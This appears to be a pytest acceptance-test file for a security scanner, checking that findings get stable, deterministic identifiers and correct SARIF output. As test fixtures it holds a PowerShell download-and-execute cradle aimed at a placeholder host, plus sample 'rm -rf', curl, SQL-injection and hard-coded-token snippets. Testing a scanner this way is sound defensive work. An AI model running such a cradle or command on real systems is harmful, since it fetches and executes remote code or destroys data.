"""B3-ID Phase A acceptance tests (T1-T14) -- tests-first execution.

Contract: audit_output/B3_ID_PHASE_A_IMPLEMENTATION_CONTRACT.md @ aa4e2be.
All pinned digest/uid prefixes below were computed by the contract oracle
run and are NORMATIVE: if one of these values changes, the identity contract
broke -- fix the implementation, never the pin.

Known disclosed limitation (contract §3, L1/N6): whitespace carries no
identity. Indistinguishable duplicate instances are separated only by their
sorted line position (ordinal); swapping two identical instances' positions
swaps their uids -- no stable distinguishing information exists, and none is
promised (test_t06 pins this honestly).
"""
from __future__ import annotations

import hashlib
import os
import random
import re
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import finding_identity as fi  # noqa: E402
from core.analyzer import build_report_payload, deduplicate  # noqa: E402
from core.deduplicator import root_key  # noqa: E402
from reporting.sarif_export import build_sarif  # noqa: E402
from scanner import sast  # noqa: E402

# ------------------------------------------------------------------ pins ----
P1_PIN = "7dee58fcfcc59b70"          # canonical / extra-ws / crlf / tabs
P1X_PIN = "1cd290fdb78a0fbf"         # reflow missing verify=True (arg change)
P2_PIN = "2dfe2081f7b10a12"          # pure reflow
N1_A, N1_B = "42b6ac58f52213e0", "2bc7530c60989e85"   # SQL literal change
N2_A, N2_B = "512eefc9a84b6faf", "78cced2f0770aed6"   # URL change
N3_A, N3_B = "0891836940cbb3fa", "d97fd315a0891136"   # case change
N4_A, N4_B = "ffeef55b1b185824", "2960fdef18116380"   # quoted content
N5_PIN = "dee9f6e5c1ae690a"          # whitespace-only edit (same)
N6_PIN = "7ff6492fc36aeb91"          # disclosed conflation class
TOK_SNIP = 'TOKEN = "ghp_16CKeSrT1234"'
TOK_DG_PREFIX = "7fa119ebab3a54c4"
TOK_UID0 = "b3id1-09bde52221c281601387248b7b1d325e"
O6_LINE42 = "b3id1-b54b57ab65e59a0b44e2131321ea3c1b"
O7_L7 = "b3id1-bb595bdc0019bb2a6a35ab1e9a2c8de6"
O7_L8 = "b3id1-59376c4fcf2ef89882e09b7b9dc6ae60"
O9_ORDER = [("SSRF", 5), ("SSRF", 10), ("SSRF", 30)]
# AMENDED pins (tests-first discovery, disclosed): the line-5 same-key pair
# resolves by scan order under the stability-preserving sort -- including the
# L1 http/SSRF conflict rule where the LAST scan-order arrival wins. That is
# the PRE-change pipeline behavior; the contract draft's SESSION-winner pin
# was an artifact of the (since amended) full-key digest ordering. The
# line-10/line-30 uids are byte-identical to the contract draft pins.
O9_WINNER_SNIP = "requests.get(url)"
O9_UIDS = [
    "b3id1-1b33608bfb1c33efbd26ad324937565a",
    "b3id1-1d0e95138a6bf270764745c8bcba5fcf",
    "b3id1-908f4164ef4ff385d9825cd1f853873b",
]
ROOT = r"D:\Data\Code test\target_app"   # lexical pin root (no FS access)
UID_RE = re.compile(r"^b3id1-[0-9a-f]{32}$")
CRADLE = 'IEX (New-Object Net.WebClient).DownloadString("http://example.invalid/{n}")'


def _mk(tree, name, line):
    p = tree / name
    p.write_text(line + "\n", encoding="utf-8")
    return p


def _payload_uids(tree, workers=1):
    """Full pipeline identity readout: scan -> build_report_payload.

    UIDs are assigned in build_report_payload (contract §4 S2 point), so the
    acceptance property is asserted on the payload findings -- the objects
    every consumer sees."""
    rows = sast.scan_directory(str(tree), workers=workers)
    assert rows, "scan produced no findings"
    payload = build_report_payload([dict(r) for r in rows], [], str(tree))
    out = payload["findings"]
    assert out, "payload lost every scanned finding"
    for r in out:
        assert r.get("finding_uid") and UID_RE.match(r["finding_uid"]), \
            f"missing/malformed uid: {r.get('finding_uid')!r}"
    return [(r.get("rule_id"), r.get("file"), r.get("line"), r["finding_uid"])
            for r in out]


# ---------------------------------------------------------------- T1/T2/T4 --
def test_t01_repeat_scan_same_uid_multiset(tmp_path):
    for i in range(5):
        _mk(tmp_path, f"m{i}.ps1", CRADLE.format(n=i))
    _mk(tmp_path, "dup.ps1", CRADLE.format(n="dup") + "\n" + CRADLE.format(n="dup"))
    a = _payload_uids(tmp_path)
    b = _payload_uids(tmp_path)
    assert sorted(a) == sorted(b)
    assert len(a) >= 6


def test_t02_worker_count_independence(tmp_path):
    for i in range(6):
        _mk(tmp_path, f"w{i}.ps1", CRADLE.format(n=f"w{i}"))
    one = _payload_uids(tmp_path, workers=1)
    four = _payload_uids(tmp_path, workers=4)
    assert one == four  # identical uid SEQUENCE, not just multiset


def test_t04_cwd_independence(tmp_path, monkeypatch):
    for i in range(5):
        _mk(tmp_path, f"c{i}.ps1", CRADLE.format(n=f"c{i}"))
    monkeypatch.chdir(tmp_path)
    at_tree = _payload_uids(tmp_path)
    monkeypatch.chdir(os.path.expanduser("~"))
    from_home = _payload_uids(tmp_path)
    assert at_tree == from_home


# --------------------------------------------------------------- T3 pins ----
def _o9_finding(snip, ln, fname="s.py"):
    return {"vuln_type": "ssrf", "file": ROOT + "\\" + fname, "line": ln,
            "rule_id": "SSRF", "engine": "scanner.sast", "snippet": snip,
            "sink_category": "http", "confidence": "Low"}


def _run_pipeline(batches, root):
    """Mirror the real S1->S2 flow: shuffled per-file batches (simulated
    as_completed interleave) -> S1 sort -> deduplicate -> UID -> S2 sort."""
    flat = [dict(x) for b in batches for x in b]
    fi.sort_in_place(flat, root)                       # S1 (stable, (cp,line))
    dd = deduplicate([dict(x) for x in flat])
    rows = fi.assign_uids([dict(x) for x in dd], root)
    return fi.sorted_canonically(rows, root)           # post-UID invariant


def test_t03_arrival_order_independence():
    # Scenario A -- single file, scan order authoritative (contract O9 pins):
    # the same-line dedup tie resolves by scan order, which is engine-
    # deterministic; the pinned uid sequence is therefore unchanged under the
    # stability-preserving sort amendment.
    single = [[_o9_finding("SESSION.get(target)", 5),
               _o9_finding("requests.get(url)", 5),
               _o9_finding(TOK_SNIP, 10),
               _o9_finding(TOK_SNIP, 90),
               _o9_finding("other sink call(data)", 30)]]
    out = _run_pipeline(single, ROOT)
    assert [(x["rule_id"], x["line"]) for x in out] == O9_ORDER
    assert out[0]["snippet"] == O9_WINNER_SNIP          # scan-order semantics
    assert [x["finding_uid"] for x in out] == O9_UIDS   # amended pins above

    # Scenario B -- the REAL nondeterminism: per-file batch arrival order
    # (as_completed interleave). Shuffling whole batches must change nothing.
    batches_a = [
        [_o9_finding("SESSION.get(target)", 5, "a.py"),
         _o9_finding("requests.get(url)", 5, "a.py")],
        [_o9_finding(TOK_SNIP, 10, "b.py"),
         _o9_finding(TOK_SNIP, 90, "b.py")],
        [_o9_finding("other sink call(data)", 30, "c.py")],
    ]
    runs = []
    for trial in range(6):
        rnd = [list(b) for b in batches_a]
        random.Random(trial).shuffle(rnd)
        res = _run_pipeline(rnd, ROOT)
        runs.append(([(x["rule_id"], x["file"], x["line"]) for x in res],
                     [x["snippet"] for x in res],
                     [x["finding_uid"] for x in res]))
    orders, snippets, uids = zip(*runs)
    assert len(set(map(str, orders))) == 1
    assert len(set(map(str, snippets))) == 1
    assert len(set(map(str, uids))) == 1
    # the a.py same-line tie winner is scan-order-determined in EVERY trial
    assert snippets[0][0] == O9_WINNER_SNIP


# --------------------------------------------------------------- T5/T6/T7 ---
def test_t05_line_shift_stability():
    cp = fi.canonical_path(ROOT + r"\src\auth.py", ROOT)
    assert cp == "src/auth.py"
    assert fi.code_digest(TOK_SNIP)[:16] == TOK_DG_PREFIX
    f = {"engine": "scanner.sast", "rule_id": "HARDCODED_SECRET",
         "file": ROOT + r"\src\auth.py", "line": 58, "snippet": TOK_SNIP}
    fi.assign_uids([f], ROOT)
    assert f["finding_uid"] == TOK_UID0    # identical to line-10 pin


def test_t06_duplicate_instances_and_positional_limitation():
    fs = [{"engine": "scanner.sast", "rule_id": "HARDCODED_SECRET",
           "file": ROOT + r"\src\auth.py", "line": ln, "snippet": TOK_SNIP}
          for ln in (10, 42)]
    fi.assign_uids(fs, ROOT)
    assert fs[0]["finding_uid"] == TOK_UID0        # pinned ordinal 0
    assert fs[1]["finding_uid"] == O6_LINE42       # pinned ordinal 1
    assert fs[0]["finding_uid"] != fs[1]["finding_uid"]
    # distinct code, same file/rule: digest separation (O7 pins)
    fs2 = [{"engine": "scanner.sast", "rule_id": "SQL_INJECTION",
            "file": ROOT + r"\src\dao.py", "line": 7,
            "snippet": 'q = "SELECT * FROM users WHERE name=" + n'},
           {"engine": "scanner.sast", "rule_id": "SQL_INJECTION",
            "file": ROOT + r"\src\dao.py", "line": 8,
            "snippet": 'q = "SELECT * FROM orders WHERE name=" + n'}]
    fi.assign_uids(fs2, ROOT)
    assert fs2[0]["finding_uid"] == O7_L7
    assert fs2[1]["finding_uid"] == O7_L8
    # DISCLOSED LIMITATION: two indistinguishable duplicates carry no stable
    # distinguishing information; their uids track sorted line POSITION.
    # Swapping the two instances' positions swaps their uids -- this is the
    # documented behavior (contract §3), not a defect to fix here.
    swap = [{"engine": "scanner.sast", "rule_id": "HARDCODED_SECRET",
             "file": ROOT + r"\src\auth.py", "line": 42, "snippet": TOK_SNIP},
            {"engine": "scanner.sast", "rule_id": "HARDCODED_SECRET",
             "file": ROOT + r"\src\auth.py", "line": 10, "snippet": TOK_SNIP}]
    fi.assign_uids(swap, ROOT)
    assert swap[1]["finding_uid"] == TOK_UID0      # position anchor, honestly


def test_t07_rule_identity_preserved():
    a = {"engine": "scanner.sast", "rule_id": "RULE_A", "file": ROOT + r"\x.py",
         "line": 3, "snippet": "sink(v)"}
    b = {"engine": "scanner.sast", "rule_id": "RULE_B", "file": ROOT + r"\x.py",
         "line": 3, "snippet": "sink(v)"}
    fi.assign_uids([a, b], ROOT)
    assert a["finding_uid"] != b["finding_uid"]
    # fallback chain: no rule_id -> vuln_type -> title -> UNRULED
    c = {"engine": "scanner.sast", "vuln_type": "sql_injection",
         "file": ROOT + r"\x.py", "line": 4, "snippet": "sink(v)"}
    d = {"file": ROOT + r"\x.py", "line": 5, "snippet": "sink(v)"}
    fi.assign_uids([c, d], ROOT)
    assert UID_RE.match(c["finding_uid"]) and UID_RE.match(d["finding_uid"])


def test_t08_cross_engine_identity():
    a = {"engine": "scanner.sast", "rule_id": "INJ", "file": ROOT + r"\y.py",
         "line": 9, "snippet": "handler(req)"}
    b = {"engine": "scanner.taint_engine", "rule_id": "INJ",
         "file": ROOT + r"\y.py", "line": 9, "snippet": "handler(req)"}
    for perm in ([a, b], [b, a]):
        pa, pb = dict(a), dict(b)
        fi.assign_uids([pa, pb], ROOT)
        assert pa["finding_uid"] != pb["finding_uid"]
    fi.assign_uids([dict(a), dict(b)], ROOT)
    ua = fi.uid_for("scanner.sast", "INJ", "y.py",
                    fi.code_digest("handler(req)"), 0)
    ub = fi.uid_for("scanner.taint_engine", "INJ", "y.py",
                    fi.code_digest("handler(req)"), 0)
    assert ua != ub


# --------------------------------------------------------- T9/T10/T12 ------
def test_t09_legacy_fields_unchanged():
    f = {"vuln_type": "ssrf", "file": "s.py", "line": 5, "rule_id": "SSRF",
         "engine": "scanner.sast", "snippet": "requests.get(u)",
         "group_key": "SSRF|s.py|5|requests.get(u)"}
    legacy_fp = hashlib.md5(
        f"{f['vuln_type']}|{f['file']}|{f['line']}".encode()).hexdigest()
    legacy_rk = root_key(dict(f))
    before = dict(f)
    fi.assign_uids([f], ROOT)
    # assign_uids added ONLY finding_uid and changed nothing else
    added = set(f) - set(before)
    assert added == {"finding_uid"}
    for k, v in before.items():
        assert f[k] == v, f"legacy field {k} mutated"
    assert f["group_key"] == "SSRF|s.py|5|requests.get(u)"
    assert legacy_fp == hashlib.md5(
        f"{before['vuln_type']}|{before['file']}|{before['line']}".encode()).hexdigest()
    assert legacy_rk == root_key(dict(before))


def test_t10_sarif_uid_key_presence_pin():
    # T10 PIN FLIP (Phase B Wave 1, disclosed in-scope change per contract
    # §7.2): the Phase A ABSENCE pin inverts with the SARIF migration. BOTH
    # directions are pinned here -- uid-bearing findings emit the additive
    # key equal to their JSON uid; findings without a uid emit NO uid key
    # (the exact historical behavior, preserved byte-identically).
    fs = [{"engine": "scanner.sast", "rule_id": "SSRF_HTTP", "vuln_type": "ssrf",
           "file": "s.py", "line": 5, "snippet": "requests.get(u)",
           "severity": "High", "title": "SSRF"}]
    fi.assign_uids(fs, ".")
    sarif = build_sarif({"findings": fs})
    res = sarif["runs"][0]["results"][0]
    assert res["partialFingerprints"]["primaryLocationLineHash"] == "s.py:5:SSRF_HTTP"
    assert res["partialFingerprints"]["rsecopsxFindingUid/v1"] == fs[0]["finding_uid"]
    assert fs[0]["finding_uid"] in repr(sarif)
    # legacy finding (no uid): the key stays ABSENT -- never fabricated
    legacy = [{"engine": "scanner.sast", "rule_id": "SSRF_HTTP", "vuln_type": "ssrf",
               "file": "s.py", "line": 5, "snippet": "requests.get(u)",
               "severity": "High", "title": "SSRF"}]
    sarif2 = build_sarif({"findings": legacy})
    blob = repr(sarif2)
    assert "finding_uid" not in blob
    assert "rsecopsxFindingUid" not in blob
    assert sarif2["runs"][0]["results"][0]["partialFingerprints"][
        "primaryLocationLineHash"] == "s.py:5:SSRF_HTTP"
    # results order == canonical order of the input findings
    assert [r["ruleId"] for r in sarif["runs"][0]["results"]] == ["SSRF_HTTP"]


def test_t12_no_payload_mutation_beyond_uid():
    f = {"engine": "scanner.sast", "rule_id": "R", "file": ROOT + r"\a.py",
         "line": 1, "snippet": "x", "severity": "High", "title": "T",
         "vuln_type": "code_injection", "description": "d", "remediation": []}
    snap = repr(sorted(f.items()))
    fi.assign_uids([f], ROOT)
    f.pop("finding_uid")
    assert repr(sorted(f.items())) == snap


# ------------------------------------------------------------- T11/T13/T14 --
def _payload_finding(i, tree_root):
    # security_misconfiguration / hardcoded_secret survive the EVIDEX
    # pattern-evidence gate for synthetic rows (probe-verified); sink-type
    # vulns (ssrf/sql_injection/code_injection) are dropped there by design.
    return {"rule_id": f"RULE_{i}", "title": f"Finding {i}",
            "vuln_type": ["security_misconfiguration",
                          "hardcoded_secret"][i % 2],
            "severity": "Medium", "priority": "P3", "confidence": "Medium",
            "language": "python", "file": str(tree_root) + f"\\m{i}.py",
            "line": 10 + i, "snippet": f"sink_{i}(arg_{i})",
            "description": "synthetic", "remediation": ["fix"],
            "engine": "scanner.sast", "sink_category": "unknown"}


def test_t11_payload_order_deterministic(tmp_path):
    base = [_payload_finding(i, tmp_path) for i in range(6)]
    runs = []
    for trial in range(3):
        rnd = [dict(x) for x in base]
        random.Random(trial).shuffle(rnd)
        payload = build_report_payload(rnd, [], str(tmp_path))
        rows = payload["findings"]
        assert len(rows) >= 4, "enrichment dropped too many synthetic rows"
        for r in rows:
            assert UID_RE.match(r.get("finding_uid") or ""), "uid missing in payload"
        runs.append([(r["rule_id"], r["file"], r["line"], r["finding_uid"])
                     for r in rows])
        # grouped (severity buckets) inherits the same deterministic order
        assert [(g["rule_id"], g["finding_uid"]) for g in payload["grouped"]] == \
            [(g["rule_id"], g["finding_uid"]) for g in rows]
    assert len(set(map(str, runs))) == 1


def test_t13_digest_oracles():
    # P1: formatting equivalence (positive)
    base = 'requests.get(url, timeout=5, verify=True)'
    assert fi.code_digest(base)[:16] == P1_PIN
    for v in ('requests.get(  url,   timeout=5,  verify=True )',
              'requests.get(url,\r\n  timeout=5, verify=True)',
              '\trequests.get(url,\ttimeout=5,\tverify=True)'):
        assert fi.code_digest(v) == fi.code_digest(base)
    # P1x: argument-list change is NOT whitespace (correctly differs)
    assert fi.code_digest('requests.get(\n    url,\n    timeout=5\n)')[:16] == P1X_PIN
    # P2: pure reflow (positive)
    assert fi.code_digest('foo(a,\n        b)') == fi.code_digest('foo(a, b)')
    assert fi.code_digest('foo(a, b)')[:16] == P2_PIN
    # N1 SQL fragments differ
    assert fi.code_digest('cursor.execute("DELETE FROM users WHERE id=" + uid)')[:16] == N1_A
    assert fi.code_digest('cursor.execute("DELETE FROM orders WHERE id=" + uid)')[:16] == N1_B
    # N2 URLs differ
    assert fi.code_digest('subprocess.run(["curl", "http://10.0.0.1/admin"])')[:16] == N2_A
    assert fi.code_digest('subprocess.run(["curl", "http://10.0.0.2/admin"])')[:16] == N2_B
    # N3 case-sensitive literals differ
    assert fi.code_digest('if role == "Admin": grant(root)')[:16] == N3_A
    assert fi.code_digest('if role == "admin": grant(root)')[:16] == N3_B
    # N4 quoted content preserved (the D6 defect is not repeated)
    assert fi.code_digest('connect(password="root")')[:16] == N4_A
    assert fi.code_digest('connect(password="toor")')[:16] == N4_B
    # N5 whitespace-only change: same digest
    assert fi.code_digest('exec("rm -rf /tmp/x")')[:16] == N5_PIN
    assert fi.code_digest('exec( "rm -rf /tmp/x" )   ')[:16] == N5_PIN
    # N6 disclosed conflation class (pinned, not hidden)
    assert fi.code_digest('x = y - -1')[:16] == N6_PIN
    assert fi.code_digest('x = y --1')[:16] == N6_PIN
    # adversarial: python indentation
    assert fi.code_digest('    x = eval(s)') == fi.code_digest('x = eval(s)')
    # adversarial: token boundaries survive whitespace removal
    assert fi.code_digest('x = -1') != fi.code_digest('x -= 1')
    assert fi.code_digest('x = - 1') == fi.code_digest('x = -1')
    # adversarial: command arguments differ
    assert fi.code_digest('system("ping -c 1 hostA")') != \
        fi.code_digest('system("ping -c 1 hostB")')
    # adversarial: file paths differ
    assert fi.code_digest("open('C:/data/a.txt')") != \
        fi.code_digest("open('C:/data/b.txt')")
    # adversarial: semantically different expressions differ
    assert fi.code_digest('total = a + b') != fi.code_digest('total = a - b')
    # adversarial: space-bearing literals conflate under the pinned policy --
    # a member of the N6/L1 disclosed class, pinned so the behavior is honest.
    assert fi.code_digest("open('C:/a b.txt')") == fi.code_digest("open('C:/ab.txt')")


def test_t14_path_oracles():
    # in-root relativization (+ win-slash root, ./, case variants)
    assert fi.canonical_path(ROOT + r"\src\a.py", ROOT) == "src/a.py"
    assert fi.canonical_path(ROOT + r"\src\A.py", "d:/data/code test/target_app/") == "src/a.py"
    assert fi.canonical_path("./src/a.py", ROOT) == "src/a.py"
    assert fi.canonical_path(ROOT + r"\SRC\A.PY", ROOT) == "src/a.py"
    # prefix-boundary: target_app2 must NOT relativize against target_app
    assert fi.canonical_path(ROOT + r"2\src\a.py", ROOT) == \
        "d:/data/code test/target_app2/src/a.py"
    # outside-root keeps lexical absolute POSIX form
    assert fi.canonical_path("C:/other/repo/src/a.py", ROOT) == \
        "c:/other/repo/src/a.py"
    # in-root relative form can never collide with outside-root absolute form
    in_root = fi.canonical_path(ROOT + r"\src\a.py", ROOT)
    out_root = fi.canonical_path("C:/other/repo/src/a.py", ROOT)
    assert in_root != out_root and ":" not in in_root
    # mount independence: same tree at a different root -> same canonical path
    assert fi.canonical_path(r"E:\mirror\target_app\src\a.py",
                             r"E:\mirror\target_app") == "src/a.py"
    # CWD independence is structural: no abspath is ever taken
    monkey_old = os.getcwd()
    try:
        os.chdir(os.path.expanduser("~"))
        assert fi.canonical_path(ROOT + r"\src\a.py", ROOT) == "src/a.py"
    finally:
        os.chdir(monkey_old)
